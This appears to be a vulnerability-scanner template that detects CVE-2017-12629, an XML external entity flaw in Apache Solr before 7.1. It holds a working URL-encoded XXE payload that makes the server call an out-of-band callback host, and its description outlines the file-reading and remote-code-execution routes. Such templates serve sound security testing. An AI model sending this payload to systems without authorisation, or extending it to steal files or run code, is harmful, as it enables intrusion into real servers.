id: CVE-2017-12629
info:
  name: Apache Solr <= 7.1 - XML Entity Injection
  author:
  - l0ne1y
  description: |-
    Apache Solr XXE & RCE 漏洞
    远程代码执行发生在 7.1 之前的 Apache Solr 和 7.1 之前的 Apache Lucene 中，方法是利用 XXE 结合使用 Config API add-listener 命令来访问 RunExecutableListener 类。尽管 Elasticsearch 使用 Lucene，但它并不容易受到此攻击。请注意，XML 外部实体扩展漏洞发生在 XML 查询解析器中，默认情况下，该漏洞可用于任何带有参数 deftype=xmlparser 的查询请求，并可被利用以将恶意数据上传到 /upload 请求处理程序或使用 ftp 作为 Blind XXE wrapper 以便从 Solr 服务器读取任意本地文件。另请注意，第二个漏洞与使用所有受影响的 Solr 版本上可用的 RunExecutableListener 远程执行代码有关。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://issues.apache.org/jira/browse/SOLR-11477
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  extractors:
  - name: core
    type: regex
    regex:
    - '"name"\:"(.*?)"'
    group: 1
    internal: true
  raw:
  - |
    GET /solr/admin/cores?wt=json HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser HTTP/1.1
    Host: {{Hostname}}
